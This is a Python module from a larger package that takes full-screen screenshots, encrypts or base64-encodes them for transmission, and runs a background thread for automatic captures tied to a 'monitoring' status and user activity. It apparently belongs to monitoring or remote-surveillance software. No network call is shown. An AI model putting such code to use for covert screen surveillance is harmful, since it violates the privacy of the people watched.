"""
Screenshot Module - Enhanced with encryption
Handles screenshot capture and automatic screenshots with secure transmission
"""
import os
import time
import base64
import io
from datetime import datetime
from PIL import ImageGrab

from .config import SCREENSHOTS_DIR, config
from .monitoring import get_monitoring_status, get_last_activity
from .encryption import encryption_manager

# Global state
screenshot_history = []
last_screenshot_time = None
auto_screenshot_enabled = False
auto_screenshot_interval = 300

def take_screenshot(encrypt=True, quality=85):
    """Capture and save screenshot with optional encryption"""
    try:
        screenshot = ImageGrab.grab()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = SCREENSHOTS_DIR / filename
        
        # Save original screenshot
        screenshot.save(filepath, "PNG")
        
        # Create screenshot data for transmission
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='JPEG', quality=quality, optimize=True)
        img_data = img_buffer.getvalue()
        
        # Encrypt screenshot data if enabled
        encrypted_data = None
        if encrypt:
            encryption_result = encryption_manager.encrypt_screenshot(img_data)
            if encryption_result['success']:
                encrypted_data = encryption_result['data']
        
        screenshot_entry = {
            "filename": filename,
            "timestamp": datetime.now().isoformat(),
            "path": str(filepath),
            "size": len(img_data),
            "encrypted": encrypt and encrypted_data is not None,
            "quality": quality
        }
        
        if encrypted_data:
            screenshot_entry["encrypted_data"] = encrypted_data
        else:
            # Store base64 encoded data for transmission
            screenshot_entry["data"] = base64.b64encode(img_data).decode('utf-8')
        
        screenshot_history.append(screenshot_entry)
        
        # Keep only last 100 screenshots
        if len(screenshot_history) > 100:
            old = screenshot_history.pop(0)
            try:
                os.remove(old['path'])
            except:
                pass
        
        return filepath
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

def get_screenshot_history():
    """Get list of all screenshots"""
    return screenshot_history.copy()

def get_latest_screenshot():
    """Get the most recent screenshot"""
    if screenshot_history:
        return screenshot_history[-1]
    return None

def auto_screenshot_thread():
    """Background thread for automatic screenshots"""
    global last_screenshot_time, auto_screenshot_enabled, auto_screenshot_interval
    
    while True:
        time.sleep(10)
        
        if not get_monitoring_status() or not auto_screenshot_enabled:
            continue
        
        now = datetime.now()
        
        if last_screenshot_time is None or \
           (now - last_screenshot_time).total_seconds() >= auto_screenshot_interval:
            
            # Check motion detection if enabled
            if config.get('motion_detection', False):
                if (now - get_last_activity()).total_seconds() > 60:
                    continue
            
            take_screenshot()
            last_screenshot_time = now

def set_auto_screenshot(enabled, interval=None):
    """Configure automatic screenshots"""
    global auto_screenshot_enabled, auto_screenshot_interval
    auto_screenshot_enabled = enabled
    if interval:
        auto_screenshot_interval = interval